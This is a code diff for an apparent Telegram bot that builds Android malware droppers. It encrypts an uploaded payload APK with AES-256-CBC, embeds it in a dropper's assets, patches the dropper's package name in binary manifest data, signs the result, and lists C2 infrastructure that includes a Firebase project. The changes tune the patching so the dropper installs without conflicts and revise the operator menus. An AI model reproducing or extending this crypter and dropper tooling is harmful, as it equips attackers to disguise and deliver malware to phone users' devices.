@@ -110,8 +110,8 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
 
     EOCD_SIG   = 0x06054b50
     MAGIC      = b"APK Sig Block 42"
-    ALGO_ID    = 0x0103
-    CHUNK_SIZE = 1 << 20
+    ALGO_ID    = 0x0103          # RSASSA-PKCS1-v1_5 + SHA-256
+    CHUNK_SIZE = 1 << 20         # 1 MiB
 
     n = len(apk_bytes)
     eocd_off = -1
@@ -123,6 +123,7 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
         return apk_bytes
 
     cd_offset = struct.unpack_from('<I', apk_bytes, eocd_off + 16)[0]
+
     part1 = apk_bytes[:cd_offset]
     part2 = apk_bytes[cd_offset:eocd_off]
     part3 = apk_bytes[eocd_off:]
@@ -144,16 +145,18 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
         b'\x5a' + struct.pack('<I', len(all_cd)) + b''.join(all_cd)
     ).digest()
 
-    cert_der = cert.public_bytes(serialization.Encoding.DER)
-    pub_der  = key.public_key().public_bytes(
+    cert_der    = cert.public_bytes(serialization.Encoding.DER)
+    pub_der     = key.public_key().public_bytes(
         serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
     )
 
     digest_item_data = struct.pack('<I', ALGO_ID) + _lp(top_digest)
     digests_list     = _lp(_lp(digest_item_data))
-    certs_list       = _lp(_lp(cert_der))
-    attrs_list       = _lp(b'')
-    signed_data      = digests_list + certs_list + attrs_list
+
+    certs_list = _lp(_lp(cert_der))
+    attrs_list = _lp(b'')
+
+    signed_data = digests_list + certs_list + attrs_list
 
     raw_sig = key.sign(signed_data, rsa_pad.PKCS1v15(), hashes.SHA256())
 
@@ -163,11 +166,11 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
     signer  = _lp(signed_data) + signatures_list + _lp(pub_der)
     signers = _lp(_lp(signer))
 
-    pair       = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
-    block_size = len(pair) + 8 + 16
-    sig_block  = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC
+    pair        = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
+    block_size  = len(pair) + 8 + 16
+    sig_block   = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC
 
-    new_cd_off   = cd_offset + len(sig_block)
+    new_cd_off  = cd_offset + len(sig_block)
     eocd_patched = bytearray(apk_bytes[eocd_off:])
     struct.pack_into('<I', eocd_patched, 16, new_cd_off)
 
@@ -234,6 +237,7 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
 
 # ─── State ────────────────────────────────────────────────────────────────────
 
+# user_id → True means waiting for APK upload
 awaiting_apk: set[int] = set()
 
 # ─── Crypto ───────────────────────────────────────────────────────────────────
@@ -254,29 +258,43 @@ def _random_pkg() -> str:
     return f"com.gdww.ihwc.{suffix}"
 
 def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
-    """Replace standalone OLD_PKG in binary AXML (UTF-16LE).
+    """Selective UTF-16LE patch of OLD_PKG in binary AXML.
 
-    Skips occurrences followed by '.' (0x2e 0x00) so class names like
-    com.gdww.ihwc.hpfv.MainActivity, ContentProvider authorities, and
-    intent action strings are left intact. DEX class descriptors still
-    use the original package; only the manifest 'package' attribute changes.
+    After matching com.gdww.ihwc.hpfv:
+      not followed by '.'           -> standalone package attr     -> PATCH
+      followed by '.' + lowercase   -> ContentProvider authority   -> PATCH
+      followed by '.' + uppercase   -> Java class name / constant  -> SKIP
+
+    Class names preserved so DEX descriptors still resolve.
+    Provider authorities patched so Android won't reject with
+    INSTALL_FAILED_CONFLICTING_PROVIDER if original app is installed.
     """
     assert len(new_pkg) == len(OLD_PKG)
     old     = OLD_PKG.encode('utf-16-le')
     new     = new_pkg.encode('utf-16-le')
-    dot_u16 = b'\x2e\x00'   # '.' in UTF-16LE
+    dot_u16 = b'\x2e\x00'
     result  = bytearray(data)
     pos     = 0
     while True:
         idx = result.find(old, pos)
         if idx == -1:
             break
-        after = bytes(result[idx + len(old):idx + len(old) + 2])
+        end   = idx + len(old)
+        after = bytes(result[end:end + 2])
         if after != dot_u16:
-            result[idx:idx + len(old)] = new
+            # Standalone package name
+            result[idx:end] = new
             pos = idx + len(new)
         else:
-            pos = idx + len(old)
+            # Dot follows — check first char of suffix (UTF-16LE: char at end+2, pad at end+3)
+            suffix_char = result[end + 2] if end + 2 < len(result) else 0
+            if 0x61 <= suffix_char <= 0x7a:  # a-z lowercase
+                # ContentProvider authority, permission name, etc. -> PATCH
+                result[idx:end] = new
+                pos = idx + len(new)
+            else:
+                # Java class name / broadcast constant (uppercase/digit) -> SKIP
+                pos = end
     return bytes(result)
 
 def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
@@ -319,7 +337,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "━━━━━━━━━━━━━━━━━━━\n"
         "Naya payload APK upload karo — main usse encrypt karke\n"
         "dropper ke andar Axyra replace kar dunga.\n\n"
-        "📦 *Dropper:* `com.gdww.ihwc.<random>`\n"
+        "📦 *Dropper:* `com.gdww.ihwc.hpfv`\n"
         "🔐 *Algo:* AES-256-CBC (IV prepended)\n"
         "📁 *Asset:* `assets/Axyra`\n\n"
         "Neeche menu se option chuno 👇",
@@ -352,8 +370,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "  2️⃣  AES-256-CBC se encrypt karunga\n"
             "  3️⃣  Random IV prepend karunga\n"
             "  4️⃣  Dropper ki `assets/Axyra` replace karunga\n"
-            "  5️⃣  Random package name assign karunga\n"
-            "  6️⃣  v1+v2 sign karke wapas bheejunga\n\n"
+            "  5️⃣  Naya dropper wapas bheejunga\n\n"
+            "⚠️ *Note:* Install ke liye re-sign karna hoga.\n"
             "Cancel karne ke liye /menu",
             parse_mode="Markdown"
         )
@@ -381,7 +399,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "━━━━━━━━━━━━━━━━━━━\n"
             f"*Dropper file:* {status}\n"
             f"*Dropper size:* {dropper_size} KB\n"
-            f"*Dropper pkg:* `com.gdww.ihwc.<random>`\n"
+            f"*Dropper pkg:* `com.gdww.ihwc.hpfv`\n"
             f"*Payload pkg:* `com.btmo.awws.hoag`\n\n"
             "*C2 Infrastructure:*\n"
             "  • Firebase: `toxicgen-f1d0c`\n"
